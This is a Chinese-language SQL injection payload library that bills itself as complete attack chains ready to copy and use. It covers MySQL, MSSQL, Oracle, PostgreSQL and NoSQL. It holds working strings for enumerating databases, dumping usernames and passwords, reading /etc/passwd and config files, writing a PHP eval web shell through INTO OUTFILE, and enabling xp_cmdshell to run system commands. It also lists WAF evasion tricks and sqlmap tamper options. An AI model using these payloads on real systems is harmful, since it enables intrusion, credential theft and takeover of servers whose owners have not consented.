# SQL 注入 Payload 库

> 每个 payload = 完整攻击链 + 绕过变体。直接复制使用。

## MySQL 注入

### 基础探测
```sql
' OR '1'='1
' OR 1=1--
1' AND '1'='1
1' AND '1'='2          -- 应返回不同
1' AND sleep(5)--       -- 时间盲注
1' AND 1=1--            -- 数字型
1' AND 1=2--            -- 数字型验证
```

### 联合查询完整链
```sql
-- 列数探测
' ORDER BY 1--  ... ORDER BY N--  (报错时N-1=列数)
' UNION SELECT NULL-- ... UNION SELECT NULL,NULL,NULL--

-- 数据提取(假设5列，第2列回显)
' UNION SELECT 1,database(),3,4,5--
' UNION SELECT 1,user(),3,4,5--
' UNION SELECT 1,version(),3,4,5--
' UNION SELECT 1,@@hostname,3,4,5--
' UNION SELECT 1,@@datadir,3,4,5--

-- 枚举
' UNION SELECT 1,group_concat(schema_name),3,4,5 FROM information_schema.schemata--
' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 FROM users LIMIT 0,3--
```

### 报错注入
```sql
' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
' AND updatexml(1,concat(0x7e,version()),1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXP(~(SELECT * FROM (SELECT version())a))--
' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
```

### 时间盲注
```sql
' AND IF(ASCII(SUBSTRING(database(),1,1))>96,SLEEP(5),0)--
' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END)--
' AND BENCHMARK(5000000,SHA1('x'))--
' AND (SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C)--
' AND GET_LOCK('sqli_test',5)--
```

### 文件操作
```sql
' UNION SELECT 1,load_file('/etc/passwd'),3,4,5--
' UNION SELECT 1,load_file('/var/www/html/config.php'),3,4,5--
' UNION SELECT 1,'<?php @eval($_POST[c]);?>',3,4,5 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,0x3c3f70687020406576616c28245f504f53545b635d293b3f3e,3,4,5 INTO DUMPFILE '/var/www/html/s.php'--
```

## MSSQL 注入

```sql
' UNION SELECT 1,@@version,3,4,5--
' UNION SELECT 1,db_name(),3,4,5--
' UNION SELECT 1,user_name(),3,4,5--
' UNION SELECT 1,system_user,3,4,5--
' UNION SELECT name,2,3,4,5 FROM master..sysdatabases--
' UNION SELECT name,2,3,4,5 FROM sysobjects WHERE xtype='U'--

-- 命令执行
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC master..xp_cmdshell 'dir C:\'--
```

## Oracle 注入

```sql
' UNION SELECT banner,NULL,NULL,NULL,NULL FROM v$version WHERE rownum=1--
' UNION SELECT user,NULL,NULL,NULL,NULL FROM DUAL--
' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM all_tables WHERE rownum<=10--
' AND dbms_pipe.receive_message('a',5)=1--
```

## PostgreSQL 注入

```sql
' UNION SELECT version(),NULL,NULL,NULL,NULL--
' UNION SELECT current_database(),NULL,NULL,NULL,NULL--
' UNION SELECT current_user,NULL,NULL,NULL,NULL--
' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--
' AND pg_sleep(5)--
' UNION SELECT pg_read_file('/etc/passwd'),NULL,NULL,NULL,NULL--
```

## NoSQL 注入

```json
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"$where": "this.username == 'admin' && this.password.match(/.*/)"}
```

## WAF 绕过矩阵

```sql
-- 关键字绕过
UnIoN SeLeCt                          -- 大小写
un/**/ion sel/**/ect                   -- 注释插入
/*!50000union*//*!50000select*/        -- MySQL内联
UNUNIONION SELSELECTECT                -- 双写

-- 空格绕过
/**/  %09(Tab)  %0a(LF)  %0b(VT)  %0c(FF)  括号  +

-- 引号绕过
0x61646D696E                           -- hex编码
char(97,100,109,105,110)              -- char函数
%df%27                                 -- GBK宽字节

-- 等号绕过
LIKE / REGEXP / IN(1) / BETWEEN / <>

-- 函数绕过
mid()=substr()=substring()=left()     -- 互替
if()=case when / XOR / DIV

-- 注释绕过
--  #  /**/  ;%00  --+-  --//  --;%00

-- 科学计数法
1e0union 1.0union 1E0union  .1union

-- 换入口
Header注入: X-Forwarded-For: 1' OR 1=1--
Cookie注入: Cookie: id=1' OR 1=1--
JSON注入: {"id": "1' OR 1=1--"}
二次注入: 先存后触发
User-Agent注入: User-Agent: 1' OR 1=1--
Referer注入: Referer: 1' OR 1=1--
```

## sqlmap tamper 速记

```bash
# 常用tamper
sqlmap -u "..." --tamper=space2comment,charencode
sqlmap -u "..." --tamper=between,randomcase,apostrophemask
sqlmap -u "..." --tamper=bluecoat,modsecurityzeroversioned
sqlmap -u "..." --tamper=versionedmorekeywords,equaltolike
sqlmap -u "..." --tamper=space2hash,space2mssqlblank,space2plus
```